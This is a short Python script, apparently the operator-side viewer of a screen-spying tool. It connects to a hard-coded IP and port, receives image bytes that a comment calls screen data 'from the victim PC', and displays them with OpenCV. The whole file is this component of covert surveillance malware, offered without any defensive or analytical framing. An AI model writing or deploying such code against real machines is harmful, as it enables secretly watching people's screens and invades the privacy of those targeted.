import socket
import cv2
import numpy as np

SERVER_IP = '10.10.101.100'
SERVER_PORT = 43511

def main():
    # Create a socket
    sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    server_addr = (SERVER_IP, SERVER_PORT)
    sockfd.connect(server_addr)

    # Receive screen data from the victim PC
    screen_data = b""
    while True:
        data = sockfd.recv(4096)  # Adjust the buffer size as per your requirements
        if not data:
            break
        screen_data += data

    # Process the received screen data
    if screen_data:
        # Decode the received data into an image
        nparr = np.frombuffer(screen_data, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

        # Display the image
        cv2.imshow('Screen', img)
        cv2.waitKey(0)

    sockfd.close()

if __name__ == '__main__':
    main()
